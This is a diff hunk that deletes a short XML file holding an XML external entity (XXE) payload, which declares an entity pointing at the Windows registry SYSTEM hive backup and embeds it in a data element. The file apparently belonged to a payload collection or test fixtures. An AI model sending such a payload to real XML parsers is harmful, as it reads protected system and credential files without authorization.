@@ -1,5 +1,0 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE data [
-<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/RegBack/SYSTEM">
-]>
-<data>&xxe;</data> 
